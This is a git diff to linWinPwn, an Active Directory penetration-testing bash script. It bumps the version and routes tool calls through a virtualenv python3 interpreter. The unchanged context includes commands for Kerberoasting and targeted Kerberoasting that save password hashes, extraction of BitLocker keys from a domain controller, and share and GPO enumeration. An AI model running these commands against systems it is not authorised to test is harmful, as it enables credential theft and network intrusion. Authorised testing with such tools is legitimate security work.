@@ -125,7 +125,7 @@ evilwinrm=$(which evil-winrm)
 ldapnomnom="$scripts_dir/ldapnomnom"
 nmap=$(which nmap)
 john=$(which john)
-python3=$(which python3)
+python3="${scripts_dir}/.venv/bin/python3"
 
 print_banner() {
     echo -e "
@@ -135,7 +135,7 @@ print_banner() {
       | || | | | |\ V  V / | | | | |  __/ \ V  V /| | | | 
       |_||_|_| |_| \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_| 
 
-      ${BLUE}linWinPwn: ${CYAN}version 1.0.18 ${NC}
+      ${BLUE}linWinPwn: ${CYAN}version 1.0.19 ${NC}
       https://github.com/lefayjey/linWinPwn
       ${BLUE}Author: ${CYAN}lefayjey${NC}
       ${BLUE}Inspired by: ${CYAN}S3cur3Th1sSh1t's WinPwn${NC}
@@ -1159,7 +1159,7 @@ silenthound_enum() {
                 current_dir=$(pwd)
                 cd "${output_dir}/DomainRecon/SilentHound" || exit
                 if [ "${ldaps_bool}" == true ]; then ldaps_param="--ssl"; else ldaps_param=""; fi
-                run_command "${silenthound} ${argument_silenthd} ${dc_ip} ${dc_domain} -g -n --kerberoast ${ldaps_param} -o ${output_dir}/DomainRecon/SilentHound/${dc_domain}" >"${output_dir}/DomainRecon/SilentHound/silenthound_output_${dc_domain}.txt"
+                run_command "${python3} ${silenthound} ${argument_silenthd} ${dc_ip} ${dc_domain} -g -n --kerberoast ${ldaps_param} -o ${output_dir}/DomainRecon/SilentHound/${dc_domain}" >"${output_dir}/DomainRecon/SilentHound/silenthound_output_${dc_domain}.txt"
                 cd "${current_dir}" || exit
                 cut -d " " -f 1 "${output_dir}/DomainRecon/SilentHound/${dc_domain}-hosts.txt" | sort -u | grep "\S" | sed -e "s/$/.${dc_domain}/" >"${output_dir}/DomainRecon/Servers/servers_list_shd_${dc_domain}.txt" 2>/dev/null
                 cut -d " " -f 2 "${output_dir}/DomainRecon/SilentHound/${dc_domain}-hosts.txt" >"${output_dir}/DomainRecon/Servers/ip_list_shd_${dc_domain}.txt" 2>/dev/null
@@ -1243,7 +1243,7 @@ ldapwordharv_enum() {
         else
             if [ "${ldaps_bool}" == true ]; then ldaps_param="--ldaps"; else ldaps_param=""; fi
             if [ "${verbose_bool}" == true ]; then verbose_p0dalirius="-v"; else verbose_p0dalirius=""; fi
-            run_command "${LDAPWordlistHarvester} ${argument_p0dalirius} ${verbose_p0dalirius} ${ldaps_param} --kdcHost ${dc_FQDN} --dc-ip ${dc_ip} -o ${output_dir}/DomainRecon/ldapwordharv_${dc_domain}.txt" 2>&1 | tee -a "${output_dir}/DomainRecon/ldapwordharv_output_${dc_domain}.txt"
+            run_command "${python3} ${LDAPWordlistHarvester} ${argument_p0dalirius} ${verbose_p0dalirius} ${ldaps_param} --kdcHost ${dc_FQDN} --dc-ip ${dc_ip} -o ${output_dir}/DomainRecon/ldapwordharv_${dc_domain}.txt" 2>&1 | tee -a "${output_dir}/DomainRecon/ldapwordharv_output_${dc_domain}.txt"
         fi
     fi
     echo -e ""
@@ -1362,8 +1362,8 @@ GPOwned_enum() {
         if [ "${nullsess_bool}" == true ] || [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ]; then
             echo -e "${PURPLE}[-] GPOwned requires credentials and does not support Kerberos authentication${NC}"
         else
-            run_command "${GPOwned} ${argument_GPOwned} -dc-ip ${dc_ip} -listgpo -gpcuser" | tee "${output_dir}/DomainRecon/GPOwned_output_${dc_domain}.txt"
-            run_command "${GPOwned} ${argument_GPOwned} -dc-ip ${dc_ip} -listgpo -gpcmachine" | tee -a "${output_dir}/DomainRecon/GPOwned_output_${dc_domain}.txt"
+            run_command "${python3} ${GPOwned} ${argument_GPOwned} -dc-ip ${dc_ip} -listgpo -gpcuser" | tee "${output_dir}/DomainRecon/GPOwned_output_${dc_domain}.txt"
+            run_command "${python3} ${GPOwned} ${argument_GPOwned} -dc-ip ${dc_ip} -listgpo -gpcmachine" | tee -a "${output_dir}/DomainRecon/GPOwned_output_${dc_domain}.txt"
         fi
     fi
     echo -e ""
@@ -1379,7 +1379,7 @@ ldap_console() {
         else
             if [ "${ldaps_bool}" == true ]; then ldaps_param="--use-ldaps"; else ldaps_param=""; fi
             if [ "${verbose_bool}" == true ]; then verbose_p0dalirius="--debug"; else verbose_p0dalirius=""; fi
-            run_command "${ldapconsole} ${argument_p0dalirius} ${verbose_p0dalirius} ${ldaps_param} --dc-ip ${dc_ip} --kdcHost ${dc_FQDN}" 2>&1 | tee -a "${output_dir}/DomainRecon/ldapconsole_output_${dc_domain}.txt"
+            run_command "${python3} ${ldapconsole} ${argument_p0dalirius} ${verbose_p0dalirius} ${ldaps_param} --dc-ip ${dc_ip} --kdcHost ${dc_FQDN}" 2>&1 | tee -a "${output_dir}/DomainRecon/ldapconsole_output_${dc_domain}.txt"
         fi
     fi
     echo -e ""
@@ -1395,7 +1395,7 @@ ldap_monitor() {
         else
             if [ "${ldaps_bool}" == true ]; then ldaps_param="--use-ldaps"; else ldaps_param=""; fi
             if [ "${verbose_bool}" == true ]; then verbose_p0dalirius="--debug"; else verbose_p0dalirius=""; fi
-            run_command "${pyLDAPmonitor} ${argument_p0dalirius} ${verbose_p0dalirius} ${ldaps_param} --dc-ip ${dc_ip} --kdcHost ${dc_FQDN}" 2>&1
+            run_command "${python3} ${pyLDAPmonitor} ${argument_p0dalirius} ${verbose_p0dalirius} ${ldaps_param} --dc-ip ${dc_ip} --kdcHost ${dc_FQDN}" 2>&1
         fi
     fi
     echo -e ""
@@ -2077,7 +2077,7 @@ kerborpheus_attack() {
             (
                 echo -e "cred ${argument_imp}\ndcip ${dc_ip}\nfile ${output_dir}/Kerberos/orpheus_kerberoast_hashes_${dc_domain}.txt\n enc 18\n hex 0x40AC0010"
                 cat /dev/tty
-            ) | /usr/bin/script -qc "${orpheus}" /dev/null | tee -a "${output_dir}/Kerberos/orpheus_output_${dc_domain}.txt"
+            ) | /usr/bin/script -qc "${python3} ${orpheus}" /dev/null | tee -a "${output_dir}/Kerberos/orpheus_output_${dc_domain}.txt"
             cd "${current_dir}" || exit
         fi
     fi
@@ -2261,7 +2261,7 @@ finduncshar_scan() {
         else
             if [ "${ldaps_bool}" == true ]; then ldaps_param="--ldaps"; else ldaps_param=""; fi
             if [ "${verbose_bool}" == true ]; then verbose_p0dalirius="-v --debug"; else verbose_p0dalirius=""; fi
-            run_command "${FindUncommonShares} ${argument_FindUncom} ${verbose_p0dalirius} ${ldaps_param} -ai ${dc_ip} -tf ${servers_smb_list} --check-user-access --export-xlsx ${output_dir}/Shares/finduncshar_${dc_domain}.xlsx" 2>&1 | tee -a "${output_dir}/Shares/finduncshar_shares_output_${dc_domain}.txt"
+            run_command "${python3} ${FindUncommonShares} ${argument_FindUncom} ${verbose_p0dalirius} ${ldaps_param} -ai ${dc_ip} -tf ${servers_smb_list} --check-user-access --export-xlsx ${output_dir}/Shares/finduncshar_${dc_domain}.xlsx" 2>&1 | tee -a "${output_dir}/Shares/finduncshar_shares_output_${dc_domain}.txt"
         fi
     fi
     echo -e ""
@@ -2524,7 +2524,7 @@ runfinger_check() {
         smb_scan
         current_dir=$(pwd)
         cd "${output_dir}/Vulnerabilities" || exit
-        run_command "${RunFinger} -f ${servers_smb_list}" | tee -a "${output_dir}/Vulnerabilities/RunFinger_${dc_domain}.txt"
+        run_command "${python3} ${RunFinger} -f ${servers_smb_list}" | tee -a "${output_dir}/Vulnerabilities/RunFinger_${dc_domain}.txt"
         cd "${current_dir}" || exit
     fi
     echo -e ""
@@ -2739,7 +2739,7 @@ targetedkerberoast_attack() {
         else
             echo -e "${BLUE}[*] Targeted Kerberoasting Attack (Noisy!)${NC}"
             if [ "${ldaps_bool}" == true ]; then ldaps_param="--use-ldaps"; else ldaps_param=""; fi
-            run_command "${targetedKerberoast} ${argument_targkerb} -D ${dc_domain} --dc-ip ${dc_ip} ${ldaps_param} --only-abuse --dc-host ${dc_NETBIOS} -o ${output_dir}/Kerberos/targetedkerberoast_hashes_${dc_domain}.txt" 2>&1 | tee "${output_dir}/Modification/targetedkerberoast_output_${dc_domain}.txt"
+            run_command "${python3} ${targetedKerberoast} ${argument_targkerb} -D ${dc_domain} --dc-ip ${dc_ip} ${ldaps_param} --only-abuse --dc-host ${dc_NETBIOS} -o ${output_dir}/Kerberos/targetedkerberoast_hashes_${dc_domain}.txt" 2>&1 | tee "${output_dir}/Modification/targetedkerberoast_output_${dc_domain}.txt"
         fi
     fi
     echo -e ""
@@ -3197,7 +3197,7 @@ bitlocker_dump() {
             echo -e "${PURPLE}[-] ExtractBitlockerKeys requires credentials ${NC}"
         else
             if [ "${verbose_bool}" == true ]; then verbose_p0dalirius="-v"; else verbose_p0dalirius=""; fi
-            run_command "${ExtractBitlockerKeys} ${argument_p0dalirius} ${ldaps_param} ${verbose_p0dalirius} --kdcHost ${dc_FQDN} --dc-ip ${dc_ip}" 2>&1 | tee "${output_dir}/Credentials/bitlockerdump_output_${dc_domain}.txt"
+            run_command "${python3} ${ExtractBitlockerKeys} ${argument_p0dalirius} ${ldaps_param} ${verbose_p0dalirius} --kdcHost ${dc_FQDN} --dc-ip ${dc_ip}" 2>&1 | tee "${output_dir}/Credentials/bitlockerdump_output_${dc_domain}.txt"
         fi
     fi
     echo -e ""
